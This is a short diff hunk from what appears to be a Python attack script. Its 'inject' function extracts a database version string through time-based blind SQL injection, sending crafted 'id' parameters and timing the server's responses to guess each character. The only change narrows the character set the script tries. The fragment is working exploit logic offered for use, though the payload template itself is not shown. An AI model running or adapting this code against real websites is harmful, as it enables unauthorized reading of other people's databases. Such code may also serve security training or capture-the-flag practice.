@@ -24,7 +24,7 @@ def inject():
 	query = "select group_concat(version())"
 	version=""
 	for num in range(1,int(length)+1):
-		for char in string.ascii_lowercase+string.ascii_uppercase+'.-0123456789': #iterating through all the possible characters.
+		for char in string.ascii_lowercase+'.-0123456789': #iterating through all the possible characters.
 			brute = version+char
 			r = requests.get(url,params={"id":payload.format(query,num,brute)})
 			time=r.elapsed.total_seconds()
